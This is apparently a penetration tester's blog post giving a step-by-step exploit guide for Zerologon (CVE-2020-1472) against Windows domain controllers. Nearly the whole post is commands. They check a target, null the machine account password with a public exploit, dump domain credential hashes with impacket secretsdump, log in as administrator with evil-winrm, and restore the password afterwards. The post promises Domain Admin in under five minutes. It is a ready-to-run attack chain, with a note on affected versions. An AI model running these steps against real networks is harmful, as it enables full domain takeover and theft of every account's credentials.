---
title: "zerologon (CVE-2020-1472)"
date: 2023-02-18
draft: false
toc: true
tags:
  - windows
  - active directory
---

## what/why the vulnerability

Why write about a vulnerability that came out in 2020? It appears that zerologon is still prevelant in many on-prem AD configurations and I came across more than one last year so I wanted to document a quick exploit guide to abuse the vulnerability. 


More technical details about the zerologon can be found here:                 
https://www.secura.com/uploads/whitepapers/Zerologon.pdf

**tl;dr get Domain Admin in less than 5 mins**

## exploit

Download the exploit and restore code from:

https://github.com/dirkjanm/CVE-2020-1472

Download the checker code from:

https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py


Check if the domain controller is vulnerable to Zerologon using zerologon_tester.py:

```bash
python3 zerologon_tester.py <NETBIOS COMPUTERNAME> <IP>
```

Reset the computer password to 0 or null using the cve-2020-1472-exploit.py python script:

```bash
python3 cve-2020-1472-exploit.py <NETBIOS COMPUTER_NAME> <IP>
```

Once the password is reset, now dump domain credentials using secretsdump from impacket from the context of the computer account:

```bash
python3 impacket/examples/secretsdump.py -just-dc DOMAIN_NAME/COMPUTER_NAME\$@10.10.10.10 -no-pass
```

Using the local administrator hash, log in to the domain controller using evil-winrm:

```bash
evil-winrm -i 10.10.10.10 -u administrator -h LM:NT
```

## restoring the domain controller

**The critical part of this attack is restoring the domain controller with the old password. If not done properly this can have very bad consequences.**

To do this, we have to dump credentials from the Domain Controller from the context of the Domain Admin.

We can do this using secretsdump:

```bash
python3 impacket/examples/secretsdump.py administrator@10.10.10.10 -hashes LM:NT
```

Copy the `plain_password_hex` value to use it to restore the credentials.

```txt
DOMAIN\MACHINENAME$:plain_password_hex:863414566959bfbf0faf7a86597f8e130296bef
6ea842b27d987a3d96a3d313537d9b9f9f3e70439a54fdad228b6e8a6f87fb6b7a10e164cd6c56
1cf1c867e6107ded7fa3679cc9ec6594c96f0d8db9f41aeadeaf0780be2f5f32779f9edf4cfc2f
34d62e210e67789531e9144fe02b1c7a972564f48d8cf59b4ab4cf7434fccfa3fc5bd4f7078d0b
ff527e1982653a385e277bb5edab8795d8f36bfa6dd828bfcbc8b429aa999c2f83dc470ddfd6ad
0d0bde75de3c8cc4edf8f63bb711cca52d9724f97a08acc499d6c6f14fe13aa49040a85a95c48a
9d2725c43b711b786c4a6115f08cb21cb21e00a18d0b43494e5
```

Use this value with the restorepassword script to restrore the Domain Controller:

```bash
python3 restorepassword.py DOMAIN_NAME/COMPUTER_NAME@COMPUTER_NAME -target-ip 10.10.10.10 -hexpass <value of plain password hex>
```

To check if the password is restored successfully, try to dump credentials from the context the computer account using secretsdump again and impacket should throw the following error:

```bash
python3 impacket/examples/secretsdump.py -just-dc DOMAIN_NAME/COMPUTER_NAME\$@10.10.10.10 -no-pass

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[*] Cleaning up...
```

## affected versions

-   Windows Server 2008 R2 for x64-based Systems Service Pack 1
-   Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
-   Windows Server 2012
-   Windows Server 2012 (Server Core installation)
-   Windows Server 2012 R2
-   Windows Server 2012 R2 (Server Core installation)
-   Windows Server 2016
-   Windows Server 2016 (Server Core installation)
-   Windows Server 2019
-   Windows Server 2019 (Server Core installation)
-   Windows Server, version 1903 (Server Core installation)
-   Windows Server, version 1909 (Server Core installation)
-   Windows Server, version 2004 (Server Core installation)

**hack responsibly!**
